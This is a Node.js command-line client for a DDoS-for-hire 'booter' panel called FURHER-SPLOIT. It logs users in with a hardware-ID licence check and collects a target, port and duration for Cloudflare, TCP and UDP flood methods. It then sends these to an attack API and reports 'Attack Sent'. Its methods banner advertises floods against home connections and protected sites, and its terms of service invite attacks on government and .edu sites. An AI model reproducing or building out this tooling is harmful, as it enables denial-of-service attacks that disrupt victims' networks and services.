const readline = require('readline');
const axios = require('axios');
const { response } = require('express');
const fs = require('fs').promises;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const rs = response;

var cmd = '';

function smallCase(input) {
  return input.toLowerCase();
}

let myCmds = ['.cf', '.tcp', '.udp', 'methods', 'logout', 'info', 'tos', 'iplookup', 'help', '?', 'portscan'];

let methodsBanner = `
\x1b[2J\x1b[1H\x1b[0m
      ╔═══════════════╦════════════════════════╦═══════════════════════════════════════╗
      ║   METHOD      ║      ATTACK ARGS       ║              METHOD INFO              ║
      ╠═══════════════╬════════════════════════╬═══════════════════════════════════════╣
      ║    .CF        ║  URL PORT TIME         ║     Used For CF With No Rules         ║
      ║    .TCP       ║  IP  PORT TIME         ║     Used For basic VPN's [TCP-ONLY]   ║
      ║ .HIVE-HOME    ║  IP  PORT TIME         ║     Used For Homes dedicated 5 GBPS   ║
      ║ .HIVE-FORT    ║  IP  PORT TIME         ║                                       ║
      ║ .HIVE-FP-TCP  ║  IP  PORT TIME         ║                                       ║
      ║ .HIVE-FP-UDP  ║  IP  PORT TIME         ║                                       ║
      ║ .HIVE-HTTP    ║  URL PORT TIME         ║                                       ║
      ║ .HIVE-HTTPS   ║  URL PORT TIME         ║                                       ║
      ║ .HIVE-L4DS    ║  IP  PORT TIME         ║                                       ║
      ║ .HIVE-L7DS    ║  URL PORT TIME         ║                                       ║
      ║ .HIVE-PROX-CF ║  URL PORT TIME THREADS ║                                       ║
      ╚═══════════════╩════════════════════════╩═══════════════════════════════════════╝\n
`;

//║             ║                 ║                                        ║ //line for later if needed

const API_SERVER = 'localhost';

let token = '';
let usernames = '';

const displayFurher = `
╔═╗╦ ╦╦═╗╦ ╦╔═╗╦═╗
╠╣ ║ ║╠╦╝╠═╣║╣ ╠╦╝
╚  ╚═╝╩╚═╩ ╩╚═╝╩╚═ v1.0
`;

const furher_tos = `
    [ ToS & User Rules ]
      │ 1: [If you can find an unblacklisted Dstat, feel free to use it.]
      │ 2: [You may not try to bypass the specifications of your user account in any way, shape, or form.]
      │ 3: [You can be banned for any reason deemed necessary by Gorillas staff team.]
      │ 4: [Do not directly badmouth FURHER-SPLOIT staff. Honesty is appreciated, but don't be disrespectful.]
      │ 5: [You may hit government sites, including ".gov", ".edu", or other government TLDs]
      │ 6: [Contact FURHER-SPLOIT staff if you need assistance]
      │ 7: [You MAY NOT Share your Login without EXPLICIT Permission from FURHER-SPLOIT staff.]
      │ 8: [You MAY NOT promote your own services power while showcasing FURHER-SPLOIT power.]
      │ 9: [You MAY NOT knowingly misrepresent FURHER-SPLOIT or any related services.]
`;

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function clearConsole() {
  const isWindows = process.platform === 'win32';
  if (isWindows) {
    console.clear();
  } else {
    process.stdout.write('\x1B[2J\x1B[0f');
  }
}

function checkServerAuth(username, password, localHWID) {
  axios.get(`http://localhost:3000/auth?username=${username}&password=${password}&hwid=${localHWID}`)
    .then(rs => {
      if (rs.status !== 200) {
        console.log("Authentication failed.");
        rl.close();
      }
      token = rs.data.success;
      usernames = username;
      takeUserInput();
    })
    .catch(error => {
      console.error("Authentication Unknown Error Please Report To Admin or Owner");
      rl.close();
    });
}

function handleCommand(cmd) {
  if (!myCmds.includes(cmd)) {
    console.log(cmd.toLowerCase());
    console.log('[x] Invalid command');
    sleep(1000).then(() => takeUserInput());
  } else {
    switch (cmd.toLowerCase()) { //whatever they put in gets converted to a lowercase string
      case '.cf':
      case '.tcp':
      case '.udp':
        rl.question('TARGET: ', (target) => {
          rl.question('PORT: ', (port) => {
            rl.question('TIME: ', (time) => {
              axios.get(`http://${API_SERVER}:3000/api/fear/?key=${token}&target=${target}&port=${port}&time=${time}&method=${cmd}`)
                .then(rs => {
                  console.log(`
                  ╔══════════════════════╗
                  ╠═══╣Attack Sent╠══════╝
                  ║   Target: ${target}
                  ║   Port: ${port}        ╔════════════════╗
                  ║   Time: ${time}      ╔═╣ API-STATUS: ${rs.status}║
                  ║   Method: ${cmd}   ║ ╚════════════════╝
                  ╚══════════════════════╝
                  `);
                  console.log(`Give the target [${target}] 5 sec till death`);
                  sleep(10000).then(() => takeUserInput());
                })
                .catch(error => {
                  console.error('Error:', error.message);
                  sleep(2000).then(() => takeUserInput());
                });
            });
          });
        });
        break;
      case 'methods':
        console.log(methodsBanner);
        sleep(10000).then(() => takeUserInput());
        break;
      case 'logout':
        console.log('Logging out. Goodbye!');
        process.exit(0);
        break;
      case 'info':
        console.log('\nCreated By: Furher Acker');
        console.log('Version: 1.0');
        console.log('Plan: Owner');
        sleep(3000).then(() => takeUserInput());
        break;
      case 'tos':
        console.log(`>${furher_tos}<`);
        sleep(3000).then(() => takeUserInput(usernames));
        break;
      case 'iplookup':
        clearConsole();
        sleep(1000).then(() => iplookup());
        break;
      case 'help':
      case '?':
        console.log(`
        Type "Methods" to show methods page
        Type "logout" to exit.
        Type "info" for information about the Node Panel.
        Type "tos" for the Terms of Service.\n
        `);
        sleep(2000).then(() => takeUserInput());
        break;
      case 'portscan':
        clearConsole();
        sleep(2000).then(() => portscan());
        break;
      case null:
        console.log("OOPS DONT KNOW WHAT HAPPEND HERE");
        sleep(3000).then(() => takeUserInput());
        break;
    }
  }
  return;
}

function iplookup() {
  rl.question('IP TO LOOKUP: ', (target) => {
    axios.get(`https://ipinfo.io/${target}/json`)
      .then(rs => {
        console.log(rs.data);
        sleep(3000).then(() => takeUserInput());
      })
      .catch(error => {
        console.error('Error:', error.message);
      });
  });
}

function portscan() {
  
  // rl.question('IP TO SCAN: '), (target) => {
    
  // }
}

function takeUserInput() {
  clearConsole();
  console.log(`${displayFurher}`);
  rl.question(`╔══◘\n╚══[${usernames}]═> `, (cmd) => {
    if (cmd === null || cmd.trim() === "") {
      takeUserInput();
    } else {
      smallCaseCmd = smallCase(cmd);
      if (myCmds.includes(smallCaseCmd)) {
        handleCommand(smallCaseCmd);
      } else {
        console.error(`[ ${cmd} ] Oops! Did You Think That Was A Command?`);
        console.log("Let's try to see what you were typing.");
        sleep(2000).then(() => handleCommand(smallCaseCmd)); // corrects what they were typing to lowercase string
      }
    }
  });
}

function login() {
  return new Promise((resolve, reject) => {
    try {
      clearConsole();
      console.log(displayFurher);
      askQuestion("USERNAME: ").then(usernames => {
        askQuestion("PASSWORD: ").then(password => {
          readLocalHWID().then(localHWID => {
            checkServerAuth(usernames, password, localHWID);
            resolve();  // Resolve the Promise when authentication is complete
          });
        });
      });
    } catch (error) {
      console.error('Error during login:', error.message);
      reject(error);  // Reject the Promise if there's an error
    }
  });
}

function readLocalHWID() {
  try {
    return fs.readFile('./TOKEN.json', 'utf8')
      .then(content => JSON.parse(content).hwid)
      .catch(error => {
        console.error('Error reading TOKEN.json:', error.message);
        return null;
      });
  } catch (error) {
    console.error('Error reading TOKEN.json:', error.message);
    return null;
  }
}

function askQuestion(question) {
  return new Promise(resolve => {
    process.stdout.write(question);
    rl.question(question, resolve);
  });
}

login().then(() => {
  console.debug();
}).catch(error => {
  console.error('Error during login:', error.message);
});
